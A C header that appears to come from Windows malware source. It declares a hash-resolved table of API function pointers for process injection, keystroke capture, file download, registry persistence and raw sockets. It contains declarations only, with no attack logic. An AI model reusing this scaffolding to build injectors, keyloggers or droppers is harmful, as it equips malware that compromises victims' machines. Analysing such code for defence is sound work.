#pragma once
#include "kernel32_functions.h"
#include "kernel32_hash.h"

#include "user32_hash.h"
#include "user32_functions.h"

#include "ntdll_hash.h"
#include "ntdll_functions.h"

#include "wininet_hash.h"
#include "wininet_functions.h"

#include "shell32_hash.h"
#include "shell32_functions.h"

#include "advapi32_hash.h"
#include "advapi32_functions.h"

#include "urlmon_hash.h"
#include "urlmon_functions.h"

#include "winsock_hash.h"
#include "winsock_functions.h"

#include "shlwapi_hash.h"
#include "shlwapi_functions.h"

typedef struct
{
	ptVirtualAlloc pVirtualAlloc;
	ptVirtualFree pVirtualFree;
	ptOpenProcess pOpenProcess;
	ptVirtualAllocEx pVirtualAllocEx;
	ptVirtualFreeEx pVirtualFreeEx;
	ptWriteProcessMemory pWriteProcessMemory;
	ptCreateRemoteThread pCreateRemoteThread;
	ptCloseHandle pCloseHandle;
	ptCreateToolhelp32Snapshot pCreateToolhelp32Snapshot;
	ptCreateProcessW pCreateProcessW;
	ptVirtualProtect pVirtualProtect;
	ptProcess32FirstW pProcess32FirstW;
	ptProcess32NextW pProcess32NextW;
	ptExitProcess pExitProcess;
	ptGetModuleFileNameW pGetModuleFileNameW;
	ptDeleteFileW pDeleteFileW;
	ptLoadLibraryW pLoadLibraryW;
	ptIsWow64Process pIsWow64Process;
	ptGetCurrentProcessId pGetCurrentProcessId;
	ptGetWindowsDirectoryW pGetWindowsDirectoryW;
	ptQueueUserAPC pQueueUserAPC;
	ptResumeThread pResumeThread;
	ptGetSystemDirectoryW pGetSystemDirectoryW;
	ptFindFirstFileW pFindFirstFileW;
	ptFindNextFileW pFindNextFileW;
	ptCreateThread pCreateThread;
	ptCreateFileW pCreateFileW;
	ptWriteFile pWriteFile;
	ptReadFile pReadFile;
	ptGetFileSize pGetFileSize;
	ptGetVersionExW pGetVersionExW;
	ptFindFirstVolumeW pFindFirstVolumeW;
	ptGetVolumeInformationW pGetVolumeInformationW;
	ptFindVolumeClose pFindVolumeClose;
	ptMultiByteToWideChar pMultiByteToWideChar;
	ptGetModuleHandleW pGetModuleHandleW;
	ptFlushInstructionCache pFlushInstructionCache;
	ptGetProcessHeap pGetProcessHeap;
	ptHeapAlloc pHeapAlloc;
	ptHeapFree pHeapFree;
	ptGetCurrentProcess pGetCurrentProcess;
	ptThread32First pThread32First;
	ptThread32Next pThread32Next;
	ptOpenMutexW pOpenMutexW;
	ptCreateMutexW pCreateMutexW;
	ptVirtualQuery pVirtualQuery;
	ptCreateFileMappingW pCreateFileMappingW;
	ptMapViewOfFile pMapViewOfFile;
	ptUnmapViewOfFile pUnmapViewOfFile;
	ptDuplicateHandle pDuplicateHandle;
	ptGetCurrentThread pGetCurrentThread;
	ptFlushFileBuffers pFlushFileBuffers;
	ptDisconnectNamedPipe pDisconnectNamedPipe;
	ptGetProcAddress pGetProcAddress;
	ptRtlInitializeCriticalSection pRtlInitializeCriticalSection;
	ptRtlEnterCriticalSection pRtlEnterCriticalSection;
	ptRtlLeaveCriticalSection pRtlLeaveCriticalSection;
	ptCreateDirectoryW pCreateDirectoryW;
	ptWideCharToMultiByte pWideCharToMultiByte;
	ptTerminateThread pTerminateThread;
	ptGetTickCount pGetTickCount;

	ptwsprintfW pwsprintfW;
	ptwsprintfA pwsprintfA;
	ptGetCursorPos pGetCursorPos;
	ptTranslateMessage pTranslateMessage;
	ptGetKeyboardState pGetKeyboardState;
	ptToUnicode pToUnicode;

	ptInternetOpenW pInternetOpenW;
	ptInternetConnectA pInternetConnectA;
	ptInternetConnectW pInternetConnectW;
	ptHttpOpenRequestA pHttpOpenRequestA;
	ptHttpOpenRequestW pHttpOpenRequestW;
	ptHttpSendRequestA pHttpSendRequestA;
	ptHttpSendRequestW pHttpSendRequestW;
	ptInternetCloseHandle pInternetCloseHandle;
	ptInternetReadFile pInternetReadFile;

	ptSHGetFolderPathW pSHGetFolderPathW;

	ptGetUserNameA pGetUserNameA;

	ptURLDownloadToFileW pURLDownloadToFileW;
	
	ptRtlRandomEx pRtlRandomEx;
	ptNtCreateThread pNtCreateThread;
	ptNtQueryInformationProcess pNtQueryInformationProcess;
	ptNtCreateUserProcess pNtCreateUserProcess;
	ptNtMapViewOfSection pNtMapViewOfSection;
	ptNtCreateSection pNtCreateSection;
	ptLdrLoadDll pLdrLoadDll;
	ptLdrGetDllHandle pLdrGetDllHandle;
	ptNtWriteVirtualMemory pNtWriteVirtualMemory;
	ptNtAllocateVirtualMemory pNtAllocateVirtualMemory;
	ptNtProtectVirtualMemory pNtProtectVirtualMemory;
	ptNtDeviceIoControlFile pNtDeviceIoControlFile;
	ptNtSetContextThread pNtSetContextThread;
	ptNtOpenProcess pNtOpenProcess;
	ptNtClose pNtClose;
	ptNtCreateFile pNtCreateFile;
	ptNtOpenFile pNtOpenFile;
	ptNtDeleteFile pNtDeleteFile;
	ptNtReadVirtualMemory pNtReadVirtualMemory;
	ptNtQueryVirtualMemory pNtQueryVirtualMemory;
	ptNtOpenThread pNtOpenThread;
	ptNtQueryInformationThread pNtQueryInformationThread;
	ptNtResumeThread pNtResumeThread;
	ptNtFreeVirtualMemory pNtFreeVirtualMemory;
	ptNtFlushInstructionCache pNtFlushInstructionCache;
	ptNtSetInformationThread pNtSetInformationThread;
	ptNtQuerySystemInformation pNtQuerySystemInformation;
	ptLdrQueryProcessModuleInformation pLdrQueryProcessModuleInformation;
	ptRtlInitUnicodeString pRtlInitUnicodeString;
	ptNtWriteFile pNtWriteFile;
	ptNtReadFile pNtReadFile;
	ptNtDelayExecution pNtDelayExecution;
	ptNtOpenKey pNtOpenKey;
	ptNtSetValueKey pNtSetValueKey;
	ptNtQueryValueKey pNtQueryValueKey;
	ptRtlFormatCurrentUserKeyPath pRtlFormatCurrentUserKeyPath;
	ptNtQueryInformationFile pNtQueryInformationFile;

	ptWSAStartup pWSAStartup;
	ptWSACleanup pWSACleanup;
	ptsocket psocket;
	ptconnect pconnect;
	ptsend psend;
	ptrecv precv;
	ptclosesocket pclosesocket;
	ptinet_addr pinet_addr;
	pthtons phtons;
	ptgethostbyname pgethostbyname;
	ptgetaddrinfo pgetaddrinfo;
	ptGetAddrInfoW pGetAddrInfoW;
	ptfreeaddrinfo pfreeaddrinfo;
	pt__WSAFDIsSet p__WSAFDIsSet;
	ptbind pbind;
	ptlisten plisten;
	ptaccept paccept;
	ptselect pselect;

	ptwvsprintfA pwvnsprintfA;
	ptwvsprintfW pwvnsprintfW;
	ptStrStrA pStrStrA;
	ptStrStrW pStrStrW;
} apis_t;

typedef struct
{
	HMODULE hKernel32, hNtdll, hUser32, hWininet, hShell32, hAdvapi32, hUrlmon, hWs2_32, hShlwapi;
} modules_t;

typedef struct
{
	DWORD dwModuleHash;
	HMODULE* pModule;
} module_t;

typedef struct
{
	DWORD dwFunctionHash;
	HMODULE* pModule;
	LPVOID* pFunction;
} api_t;

typedef struct
{
	DWORD crc32table[256];
	BOOL crc32Initialized;
}crc_t;